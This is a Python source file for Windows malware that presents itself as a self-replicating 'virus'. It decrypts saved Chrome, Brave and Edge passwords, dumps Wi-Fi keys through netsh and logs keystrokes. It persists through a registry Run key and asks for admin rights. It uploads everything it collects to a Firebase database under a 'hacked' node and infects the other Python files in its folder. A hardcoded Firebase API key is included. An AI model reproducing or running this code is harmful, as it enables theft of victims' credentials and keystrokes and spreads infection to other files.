#b052f566-8eda-482f-a53f-4542e0144d44
#
#W@RL0RD says hello...
#firebase
import winreg as reg
from cryptography.fernet import Fernet
import os
import sys
import os.path
import uuid
import platform
import subprocess
import pyrebase
import getpass  
import ctypes
import glob
import requests
import keyboard
from pynput.keyboard import Key, Listener
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta


#Get chrome passwords
def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
def get_encryption_key(chromebrave):
    if os.path.isfile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")) and chromebrave==0:
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    if os.path.isfile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Local State")) and chromebrave==1:
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Local State")
    if os.path.isfile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Local State")) and chromebrave==2:
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Local State") 
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
def decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""
def main(chromebrave):
    dbase=firebase.database()
    file_contents_json={}
    key = get_encryption_key(chromebrave)
    if os.path.isfile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")) and chromebrave==0:
        subprocess.call("TASKKILL /f  /IM  CHROME.EXE")
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
    if os.path.isfile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data")) and chromebrave==1:
        subprocess.call("TASKKILL /f  /IM  BRAVE.EXE")
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data")
    if os.path.isfile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data")) and chromebrave==2:
        subprocess.call("TASKKILL /f  /IM  EDGE.EXE")
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data")
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    i=0
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]        
        if username or password:
            file_contents_json[str(i)]={'Origin URL':origin_url, 'Action URL':action_url, 'Username':username, 'Password':password}
            print(f"Origin URL: {origin_url}")
            print(f"Action URL: {action_url}")
            print(f"Username: {username}")
            print(f"Password: {password}")
        else:
            continue
        if date_created != 86400000000 and date_created:
            print(f"Creation date: {str(get_chrome_datetime(date_created))}")
        if date_last_used != 86400000000 and date_last_used:
            print(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
        print("="*50)
        i+=1
    cursor.close()
    db.close()
    file_contents_json=json.dumps(file_contents_json, indent = 4)
    with open('data/pass.json', 'w+') as f:
        f.write(file_contents_json)
    try:
        # try to remove the copied db file
        os.remove(filename)
    except:
        pass
    contennnts={}
    with open('data/pass.json', 'r') as f:
        file_contents_json=json.load(f)
    if chromebrave==1:
        contennnts['Brave Data']=file_contents_json
        if not dbase.child('hacked').child(str(lines[0][1:-1])).child('Brave Data').shallow().get().val():
            dbase.child('hacked').child(str(lines[0][1:-1])).update(contennnts)
        else:
            dbase.child('hacked').child(str(lines[0][1:-1])).child('Brave Data').remove()
            dbase.child('hacked').child(str(lines[0][1:-1])).update(contennnts)
        print('Brave')
    elif chromebrave==0:
        contennnts['Chrome Data']=file_contents_json
        if not dbase.child('hacked').child(str(lines[0][1:-1])).child('Chrome Data').shallow().get().val():
            dbase.child('hacked').child(str(lines[0][1:-1])).update(contennnts)
        else:
            dbase.child('hacked').child(str(lines[0][1:-1])).child('Chrome Data').remove()
            dbase.child('hacked').child(str(lines[0][1:-1])).update(contennnts)
        print('Chrome')
    elif chromebrave==2:
        contennnts['Edge Data']=file_contents_json
        if not dbase.child('hacked').child(str(lines[0][1:-1])).child('Edge Data').shallow().get().val():
            dbase.child('hacked').child(str(lines[0][1:-1])).update(contennnts)
        else:
            dbase.child('hacked').child(str(lines[0][1:-1])).child('Edge Data').remove()
            dbase.child('hacked').child(str(lines[0][1:-1])).update(contennnts)
        print('Edge')
    
    #encrypt pass.json


#keylogging
bad_keys=[Key.alt, Key.cmd, Key.ctrl, Key.down, Key.end,Key.f1,Key.f10,Key.f11,Key.f12,Key.f13,Key.f14,Key.f15,Key.f16,Key.f17,Key.f18,Key.f19,Key.f2,Key.f20,Key.f3,Key.f4,Key.f5,Key.f6,Key.f7,Key.f8,Key.f9,Key.home,Key.insert,Key.left,Key.menu,Key.pause,Key.right,Key.shift,Key.tab,Key.up]
full_log=''
word=''
char_limit=50
def Press(key):
    global full_log, word, char_limit
    key=key.name
    print(key)
    # if key in bad_keys:
    #     pass
    if key=='space':
        full_log+=word
        word=''
        full_log+=' '
        if len(full_log)>=char_limit:
            msg(full_log)
            full_log=''
    elif key=='enter':
        full_log+=word
        word=''
        full_log+='\n'
        if len(full_log)>=char_limit:
            msg(full_log)
            full_log=''
    elif key=='backspace':
        if len(full_log)>0:
            word=word[:-1]
    elif key=='decimal':
        char='.'
        word+=char
    else: 
        word+=key






with open(__file__, 'r') as f:
    lines=f.readlines()
USER_NAME = getpass.getuser()
def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
        s_name=__file__
        address=os.path.join(file_path, s_name)
        key = reg.HKEY_CURRENT_USER
        key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
        open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS)
        reg.SetValueEx(open,"VIRUS",0,reg.REG_SZ,address)
        reg.CloseKey(open)
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
if is_admin():
    add_to_startup()
elif lines[0]=='#UUID\n':
    # Re-run the program with admin rights
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)

config = {"apiKey": "AIzaSyCc_1Dq-apLbGwuv1H1vTTRdCI0KSGyNX8","authDomain": "virusdata-education-purposes.firebaseapp.com","databaseURL": "https://virusdata-education-purposes-default-rtdb.firebaseio.com/","storageBucket": "virusdata-education-purposes.appspot.com","serviceAccount": "creds.json"}
firebase = pyrebase.initialize_app(config)
db=firebase.database()
tmp__data=platform.uname()
data={}
data['OS']=tmp__data.system
data['Node']=tmp__data.node
data['Release']=tmp__data.release
data['Version']=tmp__data.version
data['Machine']=tmp__data.machine
data['Storage']=''

metadata=subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'])
tmpdata=metadata.decode('utf-8', errors ="backslashreplace")
tmpdata = tmpdata.split('\n')
profiles=[]
for i in tmpdata:
    if "All User Profile" in i :
        i = i.split(":")
        i = i[1]
        i = i[1:-1]
        profiles.append(i)
wifis={}
for i in profiles:
    try:
        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear'])
        results = results.decode('utf-8', errors ="backslashreplace")
        results = results.split('\n')
        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]

        i=str(i).replace('.', '**DOT**').replace('$', '**DOLLAR**').replace('[', '**LEFTBRACKET**').replace(']', '**RIGHTBRACKET**').replace('#', '**HASH**').replace('£', '**POUND**').replace('/', '**FORWARDSLASH**')
        results[0]=str(results[0]).replace('.', '**DOT**').replace('$', '**DOLLAR**').replace('[', '**LEFTBRACKET**').replace(']', '**RIGHTBRACKET**').replace('#', '**HASH**').replace('£', '**POUND**').replace('/', '**FORWARDSLASH**')
        
        #replace invalid chars like . $ [ ] # £ /
        try:
            wifis[i]=results[0]
        except IndexError:
            wifis[i]=''
    except subprocess.CalledProcessError:
        pass
data['Wifis']=wifis
print (wifis)
with open(__file__, 'r') as f:
    lines=f.readlines()
if lines[0]=='#UUID\n':
    uuid_laptop=uuid.uuid4()
    lines[0]='#'+str(uuid_laptop)+'\n'
    db.child('hacked').child(str(uuid_laptop)).set(data) 
    with open(__file__, 'w') as f:
        f.writelines(lines)
else:
    db.child('hacked').child(str(lines[0][1:-1])).remove()
    db.child('hacked').child(str(lines[0][1:-1])).set(data) 
main(2)
main(1)
main(0)

def msg(text):
    print('sent')
    storage=firebase.storage()
    db=firebase.database()
    if db.child('hacked').child(str(lines[0][1:-1])).child('Storage').shallow().get().val():
        storage.child(str(lines[0][1:-1])).child('Keys.txt').download('Keys.txt')
        storage.delete(str(lines[0][1:-1])+'/Keys.txt')
        with open('Keys.txt', 'r') as f:
            tmp_lines=f.readlines() 
            f.close()
        with open('Keys.txt', 'w') as f:
            f.writelines(str(tmp_lines)+'\n'+str(text)) 
            f.close()
            storage.child(str(lines[0][1:-1])).child('Keys.txt').put('Keys.txt')
            os.remove('Keys.txt')
        
    else: 
        print('1st time')
        with open('Keys.txt', 'w+') as f:
            f.writelines(str(text))
            f.close()
            storage.child(str(lines[0][1:-1])).child('Keys.txt').put('Keys.txt')
            os.remove('Keys.txt')
    db.child('hacked').child(str(lines[0][1:-1])).update({'Storage':storage.child(str(lines[0][1:-1])).get_url(None)})
    
    
            




virus_code=[]
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()
self_replicating_part = False
for line in lines:
    if line == "#W@RL0RD says hello...":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == "#virusend\n":
        break
#repllicate in other .py
python_files = glob.glob('*.py') + glob.glob('*.pyw')

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()

    infected = False

    for line in file_code:
        if line == "#W@RL0RD says hello...\n":
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)
    
def malicious_code():
    print("hehe boii")

malicious_code()
#virusend

keyboard.on_release(callback=Press)
keyboard.wait()